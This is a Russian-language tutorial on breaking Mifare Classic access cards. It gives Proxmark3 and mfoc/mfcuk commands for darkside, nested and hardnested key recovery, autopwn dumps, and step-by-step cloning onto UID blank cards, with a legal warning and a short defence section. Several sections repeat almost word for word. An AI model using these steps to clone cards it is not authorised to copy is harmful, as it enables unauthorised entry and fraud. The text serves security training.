Mifare Classic — самая распространённая карта доступа, и её шифр Crypto1 полностью сломан. Урок — продвинутое продолжение `hardware-rfid-nfc`: разбираем, как именно восстанавливаются ключи разными атаками, когда какая работает и как автоматизировать полный дамп.

## Теория

Mifare Classic 1K — 16 секторов по 4 блока (16 байт). Каждый сектор защищён двумя ключами: A и B. Последний блок сектора (trailer) содержит ключи и биты доступа.

**Crypto1** — потоковый шифр с 48-битным внутренним состоянием (LFSR) и 48-битным ключом. Несмотря на сломанность, атака требует «диалога» с картой.

Атаки:

| Атака | Условие | Время | Надёжность |
|-------|---------|-------|-----------|
| **nested** | известен ≥1 ключ сектора | секунды | высокая |
| **darkside** | нет известных ключей, но карта уязвима | минуты | средняя (нужен «открытый» nonce) |
| **hardnested** | нет известных ключей | часы | высокая |
| **staticnested** | известен ключ, карта «статичная» | быстро | зависит от карты |
| **mfkey32v2** | есть nonce из трафика | секунды | высокая (атака на утечку) |

Идея nested: карта при аутентификации использует nonce; зная один ключ, можно вынудить карту зашифровать nonce для другого сектора и восстановить ключ.

## Инструменты и команды

- **Proxmark3 (RRG)** — основной инструмент, `hf mf autopwn`.
- **mfoc / mfcuk** — для ACR122U.
- **libnfc** — низкоуровневый доступ.
- **pm3 scripts**: `hf mf nested`, `hf mf darkside`, `hf mf hardnested`.

```text
# --- Proxmark3: полный автоподбор ключей ---
pm3 --> hf mf autopwn
# Порядок: проверка словаря ключей -> nested -> darkside -> hardnested
# Результат: dump.bin + keys.bin

# --- nested вручную ---
pm3 --> hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF
# Использует известный ключ A сектора 0 для восстановления остальных

# --- darkside (нет известных ключей) ---
pm3 --> hf mf darkside

# --- hardnested (если darkside не сработал) ---
pm3 --> hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tk

# --- проверить найденные ключи ---
pm3 --> hf mf chk --1k -f keys.bin
```

```bash
# --- mfoc с ACR122U ---
mfoc -O dump.mfd          # nested-атака, восстановление ключей и дамп
# --- mfcuk: darkside ---
mfcuk -C -R 0:A -s 250 -S 250 -O dump.mfd
```

## Разобранный пример: полное восстановление доступа

**Дано:** Mifare Classic 1K, неизвестны ключи. Proxmark3.

**Шаг 1 — определить карту.** `hf search` → Mifare Classic 1K, UID.

**Шаг 2 — словарь.** `hf mf chk --1k -f default_keys.dic` — проверяем стандартные ключи (`FFFFFFFFFFFF`, `A0A1A2A3A4A5`, и т.д.). Часто хотя бы один сектор открыт.

**Шаг 3 — если есть хоть один ключ → nested.** `hf mf nested --1k --blk 0 -a -k <известный>`. Восстанавливает ключи остальных секторов, если карта не «статичная».

**Шаг 4 — если ключей нет → darkside.** `hf mf darkside` — извлекает ключ из nonce. Работает не на всех картах (зависит от партии).

**Шаг 5 — если darkside не сработал → hardnested.** `hf mf hardnested`. Медленно (часы), но надёжно.

**Шаг 6 — дамп и клон.** `hf mf dump` → `hf mf cload -f dump.bin` в UID-карту. Или эмуляция `hf mf sim`.

**Шаг 7 — анализ данных.** В дампе — UID, данные секторов, ключи. Часто СКУД использует UID + один сектор. Разбираем структуру (BCD-кодировка номера, срок действия).

## Частые ошибки

- **Нет ключа вообще и darkside не работает.** Тогда только hardnested (часы) или fault injection.
- **«Статичная» карта.** Некоторые клоны не генерируют настоящий nonce — nested не сработает, нужен staticnested.
- **Плохой контакт/питание.** Атаки чувствительны; Proxmark должен иметь хорошее питание.
- **Игнорирование битов доступа.** После восстановления ключей можно наткнуться на запрет записи — читать можно, писать нет.
- **Долгие атаки.** hardnested — часы; запускайте с запасом времени и логируйте прогресс.
- **Правовые рамки.** Клонирование чужих карт (транспорт, банки, офис) — преступление.

## Теория: Crypto1 и атаки

Mifare Classic использует потоковый шифр Crypto1 с 48-битным ключом. Уязвимости: слабый PRNG, утечки через NACK, возможность восстановления ключа по обмену. Атаки: `darkside` (получить ключ без знания), `nested` (зная один ключ, получить остальные), `hardnested` (для защищённых карт, статистическая). После извлечения ключей карта читается полностью и клонируется.

## Инструменты и команды

```bash
proxmark3 /dev/ttyACM0
hf search
hf mf autopwn            # автоматический подбор ключей и дамп
hf mf darkside           # darkside-атака
hf mf nested --1k -a -k <key>   # nested
hf mf hardnested         # hardnested
hf mf dump               # дамп после получения ключей
hf mf restore            # записать на болванку
# mfoc / mfcuk (альтернативы)
mfoc -O dump.mfd
mfcuk -C -R 0:A -s 250 -S 250
```

`hf mf autopwn` — самый быстрый путь: он перебирает атаки и делает дамп. `darkside` нужен, когда нет ни одного ключа; `nested` — когда один ключ есть.

## Разобранный пример 2: полный дамп и клон

1. `hf search` — карта Mifare Classic 1K.
2. `hf mf darkside` — получаем первый ключ.
3. `hf mf nested --1k -a -k <key>` — получаем остальные.
4. `hf mf dump` — дамп всех секторов.
5. `hf mf restore` — записываем на UID-болванку.
6. Проверяем на своём считывателе.

## Защита

- Mifare DESFire EV2/EV3 (криптография AES).
- Уникальные ключи на карту.
- Антипассбэк и мониторинг.
- Замена Mifare Classic там, где это возможно.

## Сектора, блоки и ключи доступа

Mifare Classic 1K делится на 16 секторов по 4 блока (16 байт). Последний блок сектора — trailer: Key A, Access Bits, Key B. Access Bits определяют права (чтение/запись ключей и данных). Зная Key A или Key B, читаете сектор; для записи нужны соответствующие права. Частая ошибка — использовать дефолтные ключи (`FFFFFFFFFFFF`), которые остаются на многих картах.

```bash
hf mf chk --1k -f keys.txt      # проверка ключей
hf mf rdbl --blk 0 -a -k FFFFFFFFFFFF
```

## Практика

Считайте карту, проверьте дефолтные ключи, затем примените darkside/nested для извлечения неизвестных. Получите полный дамп, проанализируйте trailer-блоки и определите права доступа. Запишите дамп на UID-болванку и проверьте клон на своём считывателе.

## Сводка по атакам

| Атака | Условие | Команда |
|-------|---------|---------|
| darkside | нет ключей | hf mf darkside |
| nested | один ключ | hf mf nested |
| hardnested | защищённые карты | hf mf hardnested |
| autopwn | всё сразу | hf mf autopwn |

`hf mf autopwn` — самый быстрый путь к дампу. Начните с него, при неудаче — darkside/nested вручную.
